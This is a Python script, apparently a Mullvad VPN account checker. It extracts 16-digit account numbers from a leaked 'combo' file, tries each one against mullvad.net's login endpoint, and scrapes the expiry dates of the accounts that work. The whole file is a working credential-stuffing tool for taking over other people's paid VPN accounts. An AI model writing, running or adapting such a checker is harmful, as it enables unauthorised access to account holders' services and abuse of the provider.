import os
import re
import requests
from bs4 import BeautifulSoup


def mode_select():
    mode = str(input("Mode>> "))

    if mode == "1":
        print("insert ids in list.txt first")
        checker()
    if mode == "2":
        print("insert combo txt in combo.txt")
        formatter()
        print("saved to list.txt")
    else:
        print("Invild mode")

def live_check(id: str):
    session = requests.session()
    res = session.post("https://mullvad.net/en/account/login", data={"account_number": id}, headers={"Origin": "https://mullvad.net"}).json()
    if res["type"] == "redirect":
        res2 = session.get("https://mullvad.net/en/account")
        soup = BeautifulSoup(res2.text, "html.parser")
        time = soup.find(attrs={"data-cy": "account-expiry"}).text
        print(f"{time} | {id}")
    else:
        print(f"Failed to login | {id}")

def checker():
    with open("./data/list.txt", "r", encoding="utf-8") as file:
        ids = file.readlines()
    for id in ids:
        live_check(id)

def formatter():
    contents = []
    with open("./data/combo.txt", "r", errors="ignore", encoding="utf-8") as f:
        text = f.read()

    accounts = list(set(re.findall(r"\b(\d{16}|\d{4}[:\s]\d{4}[:\s]\d{4}[:\s]\d{4})\b", text)))
    for content in accounts:
        content = content.replace(" ","").replace(":","")
        contents.append(content)

    with open("./data/list.txt", "w", errors="ignore", encoding="utf-8") as f:
        f.write("\n".join(contents))

if __name__ == "__main__":
    print("""
███╗   ███╗██╗   ██╗██╗     ██╗    ██╗   ██╗ █████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
████╗ ████║██║   ██║██║     ██║    ██║   ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██╔████╔██║██║   ██║██║     ██║    ██║   ██║███████║██║  ██║       ██║   ██║   ██║██║   ██║██║     
██║╚██╔╝██║██║   ██║██║     ██║    ╚██╗ ██╔╝██╔══██║██║  ██║       ██║   ██║   ██║██║   ██║██║     
██║ ╚═╝ ██║╚██████╔╝███████╗███████╗╚████╔╝ ██║  ██║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ╚═══╝  ╚═╝  ╚═╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        made by ゆうぽん＃チック症  「チェック」だけに「チック」!wwwwwwwwwww
        [01] Live Checker   [02] Combo Formatter                                                                          
    """)
    
    while True:
        try:
            mode_select()
        except KeyboardInterrupt:
            break
        else:
            pass
